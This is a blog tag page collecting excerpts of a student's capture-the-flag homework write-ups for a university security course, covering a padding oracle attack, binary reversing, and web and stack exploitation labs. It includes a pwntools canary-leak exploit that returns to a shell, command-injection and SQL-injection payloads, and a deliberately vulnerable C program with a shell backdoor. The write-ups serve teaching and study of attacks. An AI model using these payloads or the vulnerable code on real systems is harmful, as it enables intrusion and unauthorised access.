<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tags/eductf/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Eductf"><meta property="og:locale" content="en_us"><meta property="og:type" content="website"><title>Eductf | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tags/eductf/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script><link rel=alternate type=application/rss+xml href=https://bernie6401.github.io/tags/eductf/index.xml title="SBK Hugo Site"></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Eductf</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/>NTU CS 2023 HW1 Write Up</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/crypto/>Crypto</a></div><p><h1 id=ntu-cs-2023-hw1-write-up>NTU CS 2023 HW1 Write Up
<a class=anchor href=#ntu-cs-2023-hw1-write-up>#</a></h1><p>Name: 何秉學 Student ID: R11921A16
:::spoiler TOC
[TOC]
:::</p><h2 id=lab-cor>Lab-COR
<a class=anchor href=#lab-cor>#</a></h2><p>Flag: <code>FLAG{Corre1ati0n_Attack!_!}</code></p><h3 id=解題流程與思路>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af>#</a></h3><p>這一題是簡單的padding oracle attack，他一樣是應用在CBC mode上，只是他padding的方式和上課教的有一點不一樣，他會先在最後放一個0x80然後接續放0x00直到長度%16==0，同樣的，我們可以用上課教的方式:</p><ul><li>What we have: 我們有的東西就是密文，所以可以利用它動一些手腳</li><li>Our Goal 1: 目標是要取得原本和47進行XOR的數字是多少</li><li>Our Goal 2: 這樣才可以取得最後的明文69
<img src=https://hackmd.io/_uploads/r1p3yoGlp.png alt></li><li>How to achieve: 我們可以簡單猜一個byte，從0x00開始，把密文換成猜測的byte，這樣256種組合和原本的Goal 1所求的byte進行XOR後會padding正確(也就是0x01)，此時假設我們已經猜到目前是0x2f符合padding正確的目標，代表現在的假明文是0x01，則原本和0x47進行XOR的數字就是0x01⊕0x2f，然後我們就可以回到原本解密的流程，也就是原本的密文0x47⊕剛剛得知的(0x01⊕0x2f)，就會得到想要的正確的明文0x69
<img src=https://hackmd.io/_uploads/H1yKboMlp.png alt></li></ul><p>所以套用到今天的lab意思也是一樣，如果要知道padding是否正確可以問oracle，反正只要符合明文+0x80+(0&mldr;15)*0x00，這一題的flag長度可以從題目給的ciphertext看出來，顯然扣掉16bytes的initial vector後，flag的長度是32 bytes，也就是說我們從第二個block開始解，我們可以單獨把第一個ciphertext block當成第二個ciphertext block的initial vector，合併後再一起送出去，然後不斷變化IV的最後一個byte，如果oracle回傳<code>Well received :)</code>代表第一個bytes猜對了，我們就可以把flag的最後一個bytes求出來$\to$我們猜的byte⊕原本ciphertext的最後一個byte⊕0x80(0x80是我們判斷padding正確的依據)，當然找到真正的plaintext byte後要把我們猜測的block恢復原狀，接著繼續找下一個byte</p><h2 id=lab-lsb>Lab-LSB
<a class=anchor href=#lab-lsb>#</a></h2><p>Flag: <code>FLAG{Viycx_qsklsjgmeld_fgd_spkgjo}</code></p><h3 id=解題流程與思路-1>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-1>#</a></h3><p>這一題是變形過的Lease Significant Bit，上課教的例子是mod 2下的結果，而看source code可以知道目前他是mod 3下的結果，但換湯不換藥，只要把上課教的部分全部換成mod 3就可以了</p><a href=/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/>NTU CS 2023 HW2 Write Up</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/reverse/>Reverse</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=ntu-cs-2023-hw2-write-up>NTU CS 2023 HW2 Write Up
<a class=anchor href=#ntu-cs-2023-hw2-write-up>#</a></h1><p>Name: 何秉學 Student ID: R11921A16
:::spoiler TOC
[TOC]
:::</p><h2 id=lab-hellorevworld>Lab-HelloRevWorld
<a class=anchor href=#lab-hellorevworld>#</a></h2><p>Flag: <code>FLAG{h311O_revers1ng_3ngineer5}</code></p><h3 id=解題流程與思路>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af>#</a></h3><p>這一題主要是練習如何把如何把bytes變成字串:</p><ol><li>可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用<code>Y</code>定義他的型別成<code>int dword_2008[32]</code>，前面的int就看每一個字元是來決定，後面<code>[32]</code>就代表有多少字元變成array；第二種方法就是直接按<code>d</code>改變一個字元的型態變成int，然後在<code>edit/Array</code>的地方可以叫出<code>Convert to array</code>的視窗(如果前面沒有先用<code>d</code>改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意)
<img src=https://hackmd.io/_uploads/HJ3yvI-Ga.png alt>
<img src=https://hackmd.io/_uploads/r1A_8LWMa.png alt></li><li>接著就是在<code>Option/String literals</code>視窗中設定用哪一個型態表示字串，這邊因為每一個字元都是4 bytes，也就是32 bits，所以選擇C-style
<img src=https://hackmd.io/_uploads/SyQBP8Zfp.png alt>
:::spoiler 完整流程</li></ol><pre tabindex=0><code>.rodata:0000000000002008 unk_2008 db  46h ; F                    ; DATA XREF: main+8↑o
.rodata:0000000000002009 db    0
.rodata:000000000000200A db    0
.rodata:000000000000200B db    0
.rodata:000000000000200C db  4Ch ; L
.rodata:000000000000200D db    0
.rodata:000000000000200E db    0
.rodata:000000000000200F db    0
.rodata:0000000000002010 db  41h ; A
.rodata:0000000000002011 db    0
.rodata:0000000000002012 db    0
.rodata:0000000000002013 db    0
.rodata:0000000000002014 db  47h ; G
.rodata:0000000000002015 db    0
.rodata:0000000000002016 db    0
.rodata:0000000000002017 db    0
.rodata:0000000000002018 db  7Bh ; {
.rodata:0000000000002019 db    0
.rodata:000000000000201A db    0
.rodata:000000000000201B db    0
.rodata:000000000000201C db  68h ; h
.rodata:000000000000201D db    0
.rodata:000000000000201E db    0
.rodata:000000000000201F db    0
.rodata:0000000000002020 db  33h ; 3
.rodata:0000000000002021 db    0
.rodata:0000000000002022 db    0
.rodata:0000000000002023 db    0
.rodata:0000000000002024 db  31h ; 1
.rodata:0000000000002025 db    0
.rodata:0000000000002026 db    0
.rodata:0000000000002027 db    0
.rodata:0000000000002028 db  31h ; 1
.rodata:0000000000002029 db    0
.rodata:000000000000202A db    0
.rodata:000000000000202B db    0
.rodata:000000000000202C db  4Fh ; O
.rodata:000000000000202D db    0
.rodata:000000000000202E db    0
.rodata:000000000000202F db    0
.rodata:0000000000002030 db  5Fh ; _
.rodata:0000000000002031 db    0
.rodata:0000000000002032 db    0
.rodata:0000000000002033 db    0
.rodata:0000000000002034 db  72h ; r
.rodata:0000000000002035 db    0
.rodata:0000000000002036 db    0
.rodata:0000000000002037 db    0
.rodata:0000000000002038 db  65h ; e
.rodata:0000000000002039 db    0
.rodata:000000000000203A db    0
.rodata:000000000000203B db    0
.rodata:000000000000203C db  76h ; v
.rodata:000000000000203D db    0
.rodata:000000000000203E db    0
.rodata:000000000000203F db    0
.rodata:0000000000002040 db  65h ; e
.rodata:0000000000002041 db    0
.rodata:0000000000002042 db    0
.rodata:0000000000002043 db    0
.rodata:0000000000002044 db  72h ; r
.rodata:0000000000002045 db    0
.rodata:0000000000002046 db    0
.rodata:0000000000002047 db    0
.rodata:0000000000002048 db  73h ; s
.rodata:0000000000002049 db    0
.rodata:000000000000204A db    0
.rodata:000000000000204B db    0
.rodata:000000000000204C db  31h ; 1
.rodata:000000000000204D db    0
.rodata:000000000000204E db    0
.rodata:000000000000204F db    0
.rodata:0000000000002050 db  6Eh ; n
.rodata:0000000000002051 db    0
.rodata:0000000000002052 db    0
.rodata:0000000000002053 db    0
.rodata:0000000000002054 db  67h ; g
.rodata:0000000000002055 db    0
.rodata:0000000000002056 db    0
.rodata:0000000000002057 db    0
.rodata:0000000000002058 db  5Fh ; _
.rodata:0000000000002059 db    0
.rodata:000000000000205A db    0
.rodata:000000000000205B db    0
.rodata:000000000000205C db  33h ; 3
.rodata:000000000000205D db    0
.rodata:000000000000205E db    0
.rodata:000000000000205F db    0
.rodata:0000000000002060 db  6Eh ; n
.rodata:0000000000002061 db    0
.rodata:0000000000002062 db    0
.rodata:0000000000002063 db    0
.rodata:0000000000002064 db  67h ; g
.rodata:0000000000002065 db    0
.rodata:0000000000002066 db    0
.rodata:0000000000002067 db    0
.rodata:0000000000002068 db  69h ; i
.rodata:0000000000002069 db    0
.rodata:000000000000206A db    0
.rodata:000000000000206B db    0
.rodata:000000000000206C db  6Eh ; n
.rodata:000000000000206D db    0
.rodata:000000000000206E db    0
.rodata:000000000000206F db    0
.rodata:0000000000002070 db  65h ; e
.rodata:0000000000002071 db    0
.rodata:0000000000002072 db    0
.rodata:0000000000002073 db    0
.rodata:0000000000002074 db  65h ; e
.rodata:0000000000002075 db    0
.rodata:0000000000002076 db    0
.rodata:0000000000002077 db    0
.rodata:0000000000002078 db  72h ; r
.rodata:0000000000002079 db    0
.rodata:000000000000207A db    0
.rodata:000000000000207B db    0
.rodata:000000000000207C db  35h ; 5
.rodata:000000000000207D db    0
.rodata:000000000000207E db    0
.rodata:000000000000207F db    0
.rodata:0000000000002080 db  7Dh ; }
.rodata:0000000000002081 db    0
.rodata:0000000000002082 db    0
.rodata:0000000000002083 db    0
.rodata:0000000000002084 db    0
.rodata:0000000000002085 db    0
.rodata:0000000000002086 db    0
.rodata:0000000000002087 db    0
</code></pre><p>$\downarrow$</p><a href=/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/>NTU CS 2023 HW3 Write Up</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a></div><p><h1 id=ntu-cs-2023-hw3-write-up>NTU CS 2023 HW3 Write Up
<a class=anchor href=#ntu-cs-2023-hw3-write-up>#</a></h1><h2 id=lab-stackoverflow>Lab-Stackoverflow
<a class=anchor href=#lab-stackoverflow>#</a></h2><p>Flag: <code>flag{Y0u_know_hoW2L3@k_canAry}</code></p><h3 id=解題流程與思路>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af>#</a></h3><p>這一題就是前一年的<a href=https://hackmd.io/@SBK6401/BJijt4A9s>Leak Canary</a>的應用版，當時是用pwndbg，還不知道gef的偉大，總之這一題的思路就是:</p><ol><li>接收開shell的function的address(win function)</li><li>接收0x20個bytes，分別代表RSP value/Stack Canary/RBP value/RIP</li><li>傳送payload過去，分別是<code>p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr)</code></li><li>這樣就可以蓋到RIP後又不會被偵測到canary被改變，return之後拿到shell</li></ol><p>:::info
比較值得注意的是，因為我是在公布解答前先自己寫，遇到了return之後拿不到shell的問題，後來經過助教的解釋才知道原來是，開shell的過程中<code>&lt;do_system+115> movaps XMMWORD PTR [rsp], xmm1</code>，RSP必須要是對齊的狀態，也就是最後應該要是0，但可以看下圖，如果直接跳到win function的開頭，rsp就不是0，會偏移8 bytes，所以會出現SIGSEGV
<img src=https://hackmd.io/_uploads/rJK-2d0ma.png alt=圖片></p><p>解決方式有兩個，一個是少push一次，一個是多pop一次，這樣就可以校正RSP回到0結尾的狀態，所以我們才要在RIP的地方加上(0xf1-0xe9)的offset，讓RIP可以少push一次，這樣就可以解決問題
<img src=https://hackmd.io/_uploads/ByhF2OCQa.png alt=圖片></p><p><img src=https://hackmd.io/_uploads/SyxvoO0Xa.png alt=圖片>
:::</p><h3 id=exploit---leak-canary--control-rip>Exploit - Leak Canary + Control RIP
<a class=anchor href=#exploit---leak-canary--control-rip>#</a></h3><pre tabindex=0><code class="language-python=" data-lang="python=">from pwn import *

# r = process(&#39;./lab&#39;)
r = remote(&#39;10.113.184.121&#39;, 10041)

r.recvuntil(b&#39;Gift: 0x&#39;)
win_addr = int(r.recvline().strip(), 16) + (0xf1 - 0xe9)
r.recvuntil(b&#39;Gift2: &#39;)
rsp_val = u64(r.recv(0x8))
stack_canary = u64(r.recv(0x8))
rbp_val = u64(r.recv(0x8))
rip = u64(r.recv(0x8))

log.info(f&#39;win address = {hex(win_addr)}&#39;)
log.info(f&#39;RSP value = {hex(rsp_val)}&#39;)
log.info(f&#39;Stack Canary = {hex(stack_canary)}&#39;)
log.info(f&#39;RBP value = {hex(rbp_val)}&#39;)
log.info(f&#39;RIP value = {hex(rip)}&#39;)

payload = p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr)
log.info(f&#39;Payload = {payload}&#39;)
# raw_input()
r.sendline(payload)

r.interactive()
</code></pre><h2 id=lab-shellcode>Lab-Shellcode
<a class=anchor href=#lab-shellcode>#</a></h2><p>Flag: <code>flag{How_you_do0o0o0o_sysca1111111}</code></p><a href=/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/>NTU CS 2023 HW4 Write Up</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/web/>Web</a></div><p><h1 id=ntu-cs-2023-hw4-write-up>NTU CS 2023 HW4 Write Up
<a class=anchor href=#ntu-cs-2023-hw4-write-up>#</a></h1><h2 id=lab-cat-shop>Lab-Cat Shop
<a class=anchor href=#lab-cat-shop>#</a></h2><p>Flag: <code>FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}</code></p><h3 id=解題流程與思路>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af>#</a></h3><ol><li>這一題很簡單，只要觀察送出的封包就可以知道每一個品項都是按照順序的(可預期的號碼)，所以只要把品項改成我們要的就可以成功query，如下圖，原本FLAG的column反白無法點選
<img src=https://hackmd.io/_uploads/SJ3bD8x_T.png alt=圖片>
但因為送出的item number可預期，所以還是能夠正常query
<img src=https://hackmd.io/_uploads/HJ6yDUe_a.png alt=圖片></li><li>接著看下一個packet就知道連我們的餘額以及支付金額都是裸奔的狀態，所以可以直接更改拿到flag
<img src=https://hackmd.io/_uploads/Sko9wLldp.png alt=圖片>
<img src=https://hackmd.io/_uploads/S1CovLldp.png alt=圖片></li></ol><h2 id=lab-dns-lookuper>Lab-DNS Lookuper
<a class=anchor href=#lab-dns-lookuper>#</a></h2><p>Flag: FLAG{Y0U_$(Byp4ssed)_th3_`waf`}</p><h3 id=解題流程與思路-1>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-1>#</a></h3><p>Use <font color=FF0000><strong><code>$</code></strong> or <strong>`</strong></font> string to bypass blacklist
Payload:
<code>'$(cat /fla*)'</code>
<code>'</code>cat /fl*g*<code>'</code></p><h2 id=lab-log-me-in>Lab-Log me in
<a class=anchor href=#lab-log-me-in>#</a></h2><p>Flag: <code>FLAG{b4by_sql_inj3cti0n}</code></p><h3 id=解題流程與思路-2>解題流程與思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-2>#</a></h3><ul><li>Payload → <code>') or ('1'='1') -- #</code>
SELECT * FROM admin WHERE (username=&rsquo;&rsquo;) or (&lsquo;1&rsquo;=&lsquo;1&rsquo;) &ndash; #&rsquo;) AND (password=&lsquo;MTIz&rsquo;)</li></ul><h2 id=lab-jinja2-ssti>Lab-Jinja2 SSTI
<a class=anchor href=#lab-jinja2-ssti>#</a></h2><p>Flag: <code>FLAG{ssti.__class__.__pwn__}</code></p><a href=/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/>NTU CS HW0 Write Up</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/welcome/>Welcome</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=ntu-cs-hw0-write-up>NTU CS HW0 Write Up
<a class=anchor href=#ntu-cs-hw0-write-up>#</a></h1><p>:::spoiler TOC
[TOC]
:::</p><h2 id=easy-c2>Easy C2
<a class=anchor href=#easy-c2>#</a></h2><ul><li>Flag: <code>FLAG{C2_cmd_in_http_header}</code></li></ul><h3 id=description>Description
<a class=anchor href=#description>#</a></h3><p>我們獵捕到一隻惡意程式，它似乎有與 C2 進行互動的行為。請找出它發送給 C2 的訊息。Flag 格式為：FLAG{&mldr;}。
此題模仿惡意程式與 C2 進行溝通的行為，期望能在對不熟悉逆向的同學而言不過度困難的情況下，讓同學對惡意程式行為有初步的認識。題目本身並沒有實際的惡意或影響系統運作的行為，因此可以安心執行。建議同學可以先嘗試執行程式，觀察程式的行為，嘗試找出 C2 位址以及如何與其溝通。</p><p>Google 關鍵字：IDA freeware、Ghidra、malware C2</p><h3 id=解題思路>解題思路
<a class=anchor href=#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af>#</a></h3><ol><li>Simple 解題思路<pre tabindex=0><code class=language-bash! data-lang=bash!>$ file easy-c2
easy-c2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8fa6ee42a706cfc93d97d04b3ff5e300b9f8ae02, for GNU/Linux 3.2.0, with debug_info, not stripped
</code></pre></li><li>IDA<pre tabindex=0><code class=language-cpp! data-lang=cpp!>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int sockfd; // [rsp+1Ch] [rbp-24h]
  char *flag; // [rsp+20h] [rbp-20h] BYREF
  char *enc_flag; // [rsp+28h] [rbp-18h]
  char *host; // [rsp+30h] [rbp-10h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  enc_flag = byte_20F0;
  host = &#34;127.0.0.1&#34;;
  sockfd = socket_connect(&#34;127.0.0.1&#34;, 11187);
  decode_flag(&amp;flag, byte_20F0);
  send_msg(sockfd, flag);
  puts(&#34;Message sent.&#34;);
  sleep(1u);
  free(flag);
  close(sockfd);
  return 0;
}
</code></pre>可以看得出來他會連localhost:11187，然後把decode過後的flag給送出去，所以只要會nc的都可以直接聽該port的訊息</li></ol><h3 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h3><pre tabindex=0><code class=language-bash! data-lang=bash!>$ nc -lvp 11187
Listening on 0.0.0.0 11187
Connection received on localhost 54028
GET / HTTP/1.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko, FLAG{C2_cmd_in_http_header}) Chrome/51.0.2704.103 Safari/537.36
</code></pre><h2 id=baby-crackme>Baby Crackme
<a class=anchor href=#baby-crackme>#</a></h2><ul><li>Flag: <code>FLAG{r0ll1ng_4nd_3xtr4ct_t0_m3m0ry}</code></li></ul><h3 id=description-1>Description
<a class=anchor href=#description-1>#</a></h3><p>透過此題目希望學生們可以先自行摸索過各種 SRE(Software Reverse-Engineering) 的工具與流程。 給你一些關鍵字用: IDA Freeware, Ghidra, gdb (GNU Debugger), Dynamic Analysis</p><a href=/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/>Simple Buffer Overflow - 0x05(Leak Canary)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-buffer-overflow---0x05leak-canary>Simple Buffer Overflow - 0x05(Leak Canary)
<a class=anchor href=#simple-buffer-overflow---0x05leak-canary>#</a></h1><h6 id=tags-ctf-pwn-eductf>tags: <code>CTF</code> <code>PWN</code> <code>eductf</code>
<a class=anchor href=#tags-ctf-pwn-eductf>#</a></h6><h2 id=canary-background>Canary Background
<a class=anchor href=#canary-background>#</a></h2><p><img src=https://imgur.com/onxC8Aq.png alt></p><h2 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h2><pre tabindex=0><code class=language-clike! data-lang=clike!>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

void backdoor()
{
    system(&#34;/bin/sh&#34;);
}

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);

    char name[0x10];
    char phone[0x10];

    printf(&#34;What&#39;s your name: &#34;);
    read(0, name, 0x100);
    printf(&#34;Hello, %s !&#34;, name);

    printf(&#34;What&#39;s your phone number: &#34;);
    read(0, phone, 0x100);

    return 0;
}
</code></pre><ul><li>Note that, if you establish the code yourself, you must turn off the protection by the command below and use <code>checksec</code> to observe the protection<pre tabindex=0><code class=language-bash! data-lang=bash!>gcc -o bof2_leak_canary bof2_leak_canary.c -zexecstack -no-pie -z norelro
</code></pre><img src=https://imgur.com/u5iueTC.png alt></li></ul><h2 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h2><ul><li><p>First, we can use <code>objdump -d -M Intel {filename}</code> to check the address of backdoor → <code>0x4011b6</code>
